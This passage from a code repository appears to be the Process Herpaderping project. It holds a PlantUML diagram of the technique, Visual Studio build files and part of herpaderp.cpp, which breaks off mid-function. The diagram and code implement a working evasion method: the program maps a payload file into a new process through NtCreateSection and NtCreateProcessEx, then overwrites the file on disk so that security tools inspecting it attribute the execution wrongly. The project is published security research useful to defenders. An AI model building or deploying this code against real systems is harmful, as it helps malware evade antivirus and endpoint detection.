lengthAdjust="spacingAndGlyphs" textLength="59" x="394" y="1106.7285">CloseFile</text><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="40" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="200" x="169.5" y="981"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="190" x="174.5" y="1006.7285">PspCallProcessNotifyRoutines</text><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="40" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="128" x="361.5" y="1181"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="118" x="366.5" y="1206.7285">IRP_MJ_CLEANUP</text><g id="Inspect"><rect fill="#FEFECE" filter="url(#fq3covrjt0ivw)" height="67.7969" rx="12.5" ry="12.5" style="stroke: #A80036; stroke-width: 1.5;" width="373" x="239" y="1281"/><line style="stroke: #A80036; stroke-width: 1.5;" x1="239" x2="612" y1="1308.6094" y2="1308.6094"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="45" x="403" y="1300.5332">Inspect</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="298" x="244" y="1326.0664">The contents on disk do not match what was executed.</text><text fill="#000000" font-family="sans-serif" font-size="12" lengthAdjust="spacingAndGlyphs" textLength="353" x="244" y="1341.1602">Inspection of the file at this point will result in incorrect attribution.</text></g><!--MD5=[a1738d5aca8b46c42481572a14d05487]
link *start to CreateFile--><path d="M386.5,28.06 C386.5,40.48 386.5,63.4 386.5,82.37 " fill="none" id="*start-&gt;CreateFile" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="386.5,87.61,390.5,78.61,386.5,82.61,382.5,78.61,386.5,87.61" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[386221e18d7c61b8573bac82c683c513]
link CreateFile to FileHandle--><path d="M386.5,141.06 C386.5,157.68 386.5,179.21 386.5,195.58 " fill="none" id="CreateFile-&gt;FileHandle" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="386.5,200.93,390.5,191.93,386.5,195.93,382.5,191.93,386.5,200.93" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[dd089854b98914c15a2dfe6500cd0925]
link FileHandle to Write--><path d="M350.734,241.17 C320.744,257.24 277.518,280.4 243.668,298.54 " fill="none" id="FileHandle-&gt;Write" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="239.167,300.96,248.9896,300.2418,243.5758,298.6015,245.216,293.1877,239.167,300.96" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[9eab5f3f0b9af12c958096e205b635c8]
link FileHandle to NtCreateSection--><path d="M379.527,241.22 C368.905,268.59 346.573,319.3 315.5,354 C295.219,376.65 267.783,396.36 243.875,411.13 " fill="none" id="FileHandle-&gt;NtCreateSection" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="239.454,413.83,249.22,412.5554,243.7218,411.2251,245.0521,405.7269,239.454,413.83" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[37a8eb5f1616ec382f38a3bafaa811a2]
link Write to NtCreateSection--><!--MD5=[15754293e472668ce1999f96ae72d7f9]
link NtCreateSection to SectionHandle--><path d="M191.011,467.064 C190.693,483.675 190.281,505.207 189.967,521.585 " fill="none" id="NtCreateSection-&gt;SectionHandle" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="189.865,526.927,194.0391,518.0064,189.9622,521.9279,186.0406,517.851,189.865,526.927" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[aba031e6424ccb097f08e9c096d28443]
link SectionHandle to NtCreateProcessEx--><path d="M189.133,567.167 C188.843,582.332 188.432,603.814 188.095,621.429 " fill="none" id="SectionHandle-&gt;NtCreateProcessEx" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="187.993,626.761,192.1646,617.8392,188.0887,621.7619,184.166,617.6861,187.993,626.761" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[f4d8fbd12d9e57dcf61bbd23f5b0de61]
link FileHandle to Modify--><path d="M391.812,241.03 C401.826,278.63 422.5,365.25 422.5,439.5 C422.5,439.5 422.5,439.5 422.5,548 C422.5,608.809 414.373,625.955 386.5,680 C375.962,700.433 359.95,720.473 345.898,736.01 " fill="none" id="FileHandle-&gt;Modify" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="342.372,739.86,351.399,735.9212,345.7476,736.1715,345.4974,730.5202,342.372,739.86" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[8080a8aeb559a13c1688f20af762e4ff]
link NtCreateProcessEx to Modify--><!--MD5=[186d73fa168435203317d0f274b37c9d]
link NtCreateProcessEx to NtCreateThreadEx--><path d="M192.192,680.03 C197.773,708.213 208.171,754.669 222.5,793 C229.506,811.742 239.231,831.648 248.018,848.215 " fill="none" id="NtCreateProcessEx-&gt;NtCreateThreadEx" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="250.469,852.795,249.7504,842.9724,248.1104,848.3863,242.6965,846.7462,250.469,852.795" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[f1d1a53f0532ae4b712c9fcd4b0e79db]
link Modify to NtCreateThreadEx--><!--MD5=[53cec411ee98b078e80bf6176ea508b3]
link NtCreateThreadEx to *end--><path d="M214,921.175 C191.83,936.863 167.757,957.358 151.5,981 C120.117,1026.637 114.5,1044.614 114.5,1100 C114.5,1100 114.5,1100 114.5,1202 C114.5,1276.595 144.267,1294.782 195.5,1349 C224.289,1379.4664 269.287,1402.0763 291.761,1412.1702 " fill="none" id="NtCreateThreadEx-&gt;*end" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="296.457,1414.2436,289.84,1406.9487,291.8832,1412.2237,286.6082,1414.2668,296.457,1414.2436" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[84e536d08960129cf758ec0c7a6a9db1]
link FileHandle to CloseFile--><path d="M403.454,241.12 C433.626,277.18 493.5,358.91 493.5,439.5 C493.5,439.5 493.5,439.5 493.5,888 C493.5,959.512 457.141,1038.062 436.831,1076.361 " fill="none" id="FileHandle-&gt;CloseFile" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="434.438,1080.829,442.2144,1074.7852,436.7995,1076.4218,435.1629,1071.0069,434.438,1080.829" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[6892c1e90a827790ce7e2cd1cadc12b3]
link NtCreateThreadEx to CloseFile--><!--MD5=[0d24192707b93bd6429544057bd8a5f7]
link NtCreateThreadEx to PspCallProcessNotifyRoutines--><path d="M269.5,921.3 C269.5,938.796 269.5,959.85 269.5,975.778 " fill="none" id="NtCreateThreadEx-&gt;PspCallProcessNotifyRoutines" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="269.5,980.97,273.5,971.97,269.5,975.97,265.5,971.97,269.5,980.97" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[36540dcc6a8e4fb8bb1f15fd6712b8ec]
link PspCallProcessNotifyRoutines to *end--><!--MD5=[0e9486ba90e233413004542e08f7cdbc]
link CloseFile to IRP_MJ_CLEANUP--><path d="M423.895,1121.362 C424.213,1136.932 424.661,1158.897 425.003,1175.657 " fill="none" id="CloseFile-&gt;IRP_MJ_CLEANUP" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="425.106,1180.679,428.9226,1171.5997,425.0046,1175.68,420.9242,1171.762,425.106,1180.679" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[b180cef86355a088ccd3a2c0b520b8f0]
link IRP_MJ_CLEANUP to *end--><!--MD5=[18276230a825c5744adc59d210a8d7ba]
link PspCallProcessNotifyRoutines to Inspect--><path d="M273.301,1021.229 C281.666,1060.706 304.126,1152.904 343.5,1221 C355.122,1241.099 371.507,1260.771 386.578,1276.807 " fill="none" id="PspCallProcessNotifyRoutines-&gt;Inspect" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="390.378,1280.804,387.0757,1271.5253,386.9329,1277.1803,381.2778,1277.0375,390.378,1280.804" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[5cf5ecd6d91d0c7569d66e23bd798b19]
link PspCallProcessNotifyRoutines to CloseFile--><!--MD5=[ccd1a316e3718411201de0390ea36f9e]
link IRP_MJ_CLEANUP to Inspect--><path d="M425.5,1221.253 C425.5,1236.232 425.5,1257.489 425.5,1275.875 " fill="none" id="IRP_MJ_CLEANUP-&gt;Inspect" style="stroke: #A80036; stroke-width: 1.0;"/><polygon fill="#A80036" points="425.5,1280.977,429.5,1271.977,425.5,1275.977,421.5,1271.977,425.5,1280.977" style="stroke: #A80036; stroke-width: 1.0;"/><!--MD5=[cd6e680f9770c28ac403f9aa2a362d25]
link Inspect to *end--><!--MD5=[876af4b75e7c831d546657da03149934]
@startuml
hide empty description

[*] - -> CreateFile
CreateFile - -> FileHandle
FileHandle - -> Write
FileHandle - -> NtCreateSection
Write -[hidden]-> NtCreateSection
NtCreateSection - -> SectionHandle
SectionHandle - -> NtCreateProcessEx
FileHandle - -> Modify
NtCreateProcessEx -[hidden]-> Modify
NtCreateProcessEx - -> NtCreateThreadEx
Modify -[hidden]-> NtCreateThreadEx
NtCreateThreadEx - -> [*]
FileHandle - -> CloseFile
NtCreateThreadEx -[hidden]-> CloseFile
NtCreateThreadEx - -> PspCallProcessNotifyRoutines
PspCallProcessNotifyRoutines -[hidden]-> [*]
CloseFile - -> IRP_MJ_CLEANUP
IRP_MJ_CLEANUP -[hidden]-> [*]
PspCallProcessNotifyRoutines - -> Inspect
PspCallProcessNotifyRoutines -[hidden]-> CloseFile 
IRP_MJ_CLEANUP - -> Inspect
Inspect -[hidden]-> [*]

CreateFile : Create target file, keep handle open.
Write : Write source payload into target file.
Modify : Obscure the file on disk.
NtCreateSection : Create section using file handle.
NtCreateProcessEx : Image section for process is mapped and cached in file object.
NtCreateThreadEx : The cached section is used.
NtCreateThreadEx : Process notify routines fire in kernel.
Inspect : The contents on disk do not match what was executed. 
Inspect : Inspection of the file at this point will result in incorrect attribution.
@enduml

PlantUML version 1.2020.10(Sun May 17 03:35:57 MDT 2020)
(GPL source distribution)
Java Runtime: Java(TM) SE Runtime Environment
JVM: Java HotSpot(TM) 64-Bit Server VM
Java Version: 1.8.0_261-b12
Operating System: Windows 10
Default Encoding: Cp1252
Language: en
Country: US
--></g></svg>
```

`source/ProcessHerpaderping/ProcessHerpaderping.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="herpaderp.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="utils.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="herpaderp.hpp" />
    <ClInclude Include="pch.hpp" />
    <ClInclude Include="res\resource.h" />
    <ClInclude Include="res\version.h" />
    <ClInclude Include="utils.hpp" />
  </ItemGroup>
  <ItemGroup>
    <Image Include="res\Icon.ico" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="res\resource.rc" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <ProjectGuid>{25CB55EF-7944-4234-9D2A-4BE3B291BD7F}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>ProcessHerpaderping</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>$(SolutionDir)build\$(Configuration).$(PlatformTarget)\</OutDir>
    <RunCodeAnalysis>true</RunCodeAnalysis>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>$(SolutionDir)build\$(Configuration).$(PlatformTarget)\</OutDir>
    <RunCodeAnalysis>true</RunCodeAnalysis>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)build\$(Configuration).$(PlatformTarget)\</OutDir>
    <RunCodeAnalysis>true</RunCodeAnalysis>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)build\$(Configuration).$(PlatformTarget)\</OutDir>
    <RunCodeAnalysis>true</RunCodeAnalysis>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Create</PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpplatest</LanguageStandard>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
      <TreatWarningAsError>true</TreatWarningAsError>
      <AdditionalIncludeDirectories>$(SolutionDir);$(SolutionDir)ext\submodules\;$(SolutionDir)ext\submodules\phnt\;$(SolutionDir)ext\submodules\wil\include\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PrecompiledHeaderFile>pch.hpp</PrecompiledHeaderFile>
      <GenerateXMLDocumentationFiles>true</GenerateXMLDocumentationFiles>
      <SupportJustMyCode>false</SupportJustMyCode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>bcrypt.lib;ntdll.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Create</PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpplatest</LanguageStandard>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
      <TreatWarningAsError>true</TreatWarningAsError>
      <AdditionalIncludeDirectories>$(SolutionDir);$(SolutionDir)ext\submodules\;$(SolutionDir)ext\submodules\phnt\;$(SolutionDir)ext\submodules\wil\include\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PrecompiledHeaderFile>pch.hpp</PrecompiledHeaderFile>
      <GenerateXMLDocumentationFiles>true</GenerateXMLDocumentationFiles>
      <SupportJustMyCode>false</SupportJustMyCode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>bcrypt.lib;ntdll.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Create</PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpplatest</LanguageStandard>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <TreatWarningAsError>true</TreatWarningAsError>
      <AdditionalIncludeDirectories>$(SolutionDir);$(SolutionDir)ext\submodules\;$(SolutionDir)ext\submodules\phnt\;$(SolutionDir)ext\submodules\wil\include\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PrecompiledHeaderFile>pch.hpp</PrecompiledHeaderFile>
      <GenerateXMLDocumentationFiles>true</GenerateXMLDocumentationFiles>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>bcrypt.lib;ntdll.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>Create</PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpplatest</LanguageStandard>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <TreatWarningAsError>true</TreatWarningAsError>
      <AdditionalIncludeDirectories>$(SolutionDir);$(SolutionDir)ext\submodules\;$(SolutionDir)ext\submodules\phnt\;$(SolutionDir)ext\submodules\wil\include\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PrecompiledHeaderFile>pch.hpp</PrecompiledHeaderFile>
      <GenerateXMLDocumentationFiles>true</GenerateXMLDocumentationFiles>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>bcrypt.lib;ntdll.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/ProcessHerpaderping/ProcessHerpaderping.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <ClCompile Include="herpaderp.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="utils.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="herpaderp.hpp" />
    <ClInclude Include="pch.hpp" />
    <ClInclude Include="utils.hpp" />
    <ClInclude Include="res\resource.h">
      <Filter>res</Filter>
    </ClInclude>
    <ClInclude Include="res\version.h">
      <Filter>res</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <Filter Include="res">
      <UniqueIdentifier>{c0d5b2bf-b92e-4174-b0c8-967949174b21}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="res\resource.rc">
      <Filter>res</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <Image Include="res\Icon.ico">
      <Filter>res</Filter>
    </Image>
  </ItemGroup>
</Project>
```

`source/ProcessHerpaderping/herpaderp.cpp`:

```cpp
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/herpaderp.cpp
// Author:   Johnny Shaw
// Abstract: Herpaderping Functionality
//
#include "pch.hpp"
#include "herpaderp.hpp"
#include "utils.hpp"

_Use_decl_annotations_
HRESULT Herpaderp::ExecuteProcess(
    const std::wstring& SourceFileName,
    const std::wstring& TargetFileName,
    const std::optional<std::wstring>& ReplaceWithFileName,
    std::span<const uint8_t> Pattern, 
    uint32_t Flags)
{
    if (FlagOn(Flags, FlagHoldHandleExclusive) && 
        FlagOn(Flags, FlagCloseFileEarly))
    {
        //
        // Incompatible flags.
        //
        return E_INVALIDARG;
    }

    if (FlagOn(Flags, FlagWaitForProcess) &&
        FlagOn(Flags, FlagKillSpawnedProcess))
    {
        //
        // Incompatible flags.
        //
        return E_INVALIDARG;
    }

    wil::unique_handle processHandle;
    //
    // If something goes wrong, we'll terminate the process.
    //
    auto terminateProcess = wil::scope_exit([&processHandle]() -> void
    {
        if (processHandle.is_valid())
        {
            TerminateProcess(processHandle.get(), 0);
        }
    });

    Utils::Log(Log::Success, L"Source File: \"%ls\"", SourceFileName.c_str());
    Utils::Log(Log::Success, L"Target File: \"%ls\"", TargetFileName.c_str());

    //
    // Open the source binary and the target file we will execute it from.
    //
    wil::unique_handle sourceHandle;
    sourceHandle.reset(CreateFileW(SourceFileName.c_str(),
                                   GENERIC_READ,
                                   FILE_SHARE_READ | 
                                       FILE_SHARE_WRITE | 
                                       FILE_SHARE_DELETE,
                                   nullptr,
                                   OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL,
                                   nullptr));
    if (!sourceHandle.is_valid())
    {
        RETURN_LAST_ERROR_SET(Utils::Log(Log::Error, 
                                         GetLastError(), 
                                         L"Failed to open source file"));
    }

    std::wstring targetFileName = TargetFileName;
    if (FlagOn(Flags, FlagDirectory))
    {
        Utils::Log(Log::Information, 
                   L"Targeting Directory: \"%ls\"", 
                   targetFileName.c_str());

        wil::unique_handle dirHandle;
        if (CreateDirectoryW(targetFileName.c_str(), nullptr) == FALSE)
        {
            RETURN_LAST_ERROR_SET(Utils::Log(Log::Error, 
                                             GetLastError(), 
                                             L"Failed to create directory"));
        }

        targetFileName += L":exe";

        Utils::Log(Log::Information, 
                   L"Using Directory Stream: \"%ls\"", 
                   targetFileName.c_str());
    }

    DWORD shareMode = (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (FlagOn(Flags, FlagHoldHandleExclusive))
    {
        Utils::Log(Log::Information, 
                   L"Creating target file with exclusive access");
        shareMode = 0;
    }

    wil::unique_handle targetHandle;
    targetHandle.reset(CreateFileW(targetFileName.c_str(),
                                   GENERIC_READ | GENERIC_WRITE,
                                   shareMode,
                                   nullptr,
                                   CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL,
                                   nullptr));
    if(!targetHandle.is_valid())
    {
        RETURN_LAST_ERROR_SET(Utils::Log(Log::Error, 
                                         GetLastError(), 
                                         L"Failed to create target file"));
    }

    //
    // Copy the content of the source process to the target.
    //
    HRESULT hr = Utils::CopyFileByHandle(sourceHandle.get(),
                                         targetHandle.get());
    if (FAILED(hr))
    {
        Utils::Log(Log::Error,
                   hr,
                   L"Failed to copy source binary to target file");
        RETURN_HR(hr);
    }

    Utils::Log(Log::Information, L"Copied source binary to target file");

    //
    // We're done with the source binary.
    //
    sourceHandle.reset();

    //
    // Map and create the target process. We'll make it all derpy in a moment...
    //
    wil::unique_handle sectionHandle;
    auto status = NtCreateSection(&sectionHandle,
                                  SECTION_ALL_ACCESS,
                                  nullptr,
                                  nullptr,
                                  PAGE_READONLY,
                                  SEC_IMAGE,
                                  targetHandle.get());
    if (!NT_SUCCESS(status))
    {
        sectionHandle.release();
        RETURN_NTSTATUS(Utils::Log(
                              Log::Error, 
                              status, 
                              L"Failed to create target file image section"));
    }

    Utils::Log(Log::Information, L"Created image section for target");

    status = NtCreateProcessEx(&processHandle,
                               PROCESS_ALL_ACCESS,
                               nullptr,
                               NtCurrentProcess(),
                               PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                               sectionHandle.get(),
                               nullptr,
                               nullptr,
                               0);
    if (!NT_SUCCESS(status))
    {
        processHandle.release();
        RETURN_NTSTATUS(Utils::Log(Log::Error, 
                                   status, 
                                   L"Failed to create process"));
    }

    Utils::Log(Log::Information,
               L"Created process object, PID %lu",
               GetProcessId(processHandle.get()));

    //
    // Alright we have the process set up, we don't need the section.
    //
    sectionHandle.reset();

    //
    // Go get the remote entry RVA to create a thread later on.
    //
    uint32_t imageEntryPointRva;
    hr = Utils::GetImageEntryPointRva(targetHandle.get(),
                                      imageEntryPointRva);
    if (FAILED(hr))
    {
        Utils::Log(Log::Error, 
                   hr, 
                   L"Failed to get target file image entry RVA");
        RETURN_HR(hr);
    }

    Utils::Log(Log::Information,
               L"Located target image entry RVA 0x%08x",
               imageEntryPointRva);

    //
    // Alright, depending on the parameter passed in. We will either:
    //   A. Overwrite the target binary with another.
    //   B. Overwrite the target binary with a pattern.
    //
    if (ReplaceWithFileName.has_value())
    {
        //
        // (A) We are overwriting the binary with another file.
        //
        Utils::Log(Log::Success,
                   L"Replacing target with \"%ls\"",
                   ReplaceWithFileName->c_str());

        wil::unique_handle replaceWithHandle;
        replaceWithHandle.reset(CreateFileW(ReplaceWithFileName->c_str(),
                                            GENERIC_READ,
                                            FILE_SHARE_READ |
                                                FILE_SHARE_WRITE |
                                                FILE_SHARE_DELETE,
                                            nullptr,
                                            OPEN_EXISTING,
                                            FILE_ATTRIBUTE_NORMAL,
                                            nullptr));

        if (!replaceWithHandle.is_valid())
        {
            RETURN_LAST_ERROR_SET(Utils::Log(
                                        Log::Error, 
                                        GetLastError(), 
                                        L"Failed to open replace with file"));
        }

        //
        // Replace the bytes. We handle a failure here. We'll fix it up after.
        //
        hr = Utils::CopyFileByHandle(replaceWithHandle.get(),
                                     targetHandle.get(),
                                     FlagOn(Flags, FlagFlushFile));
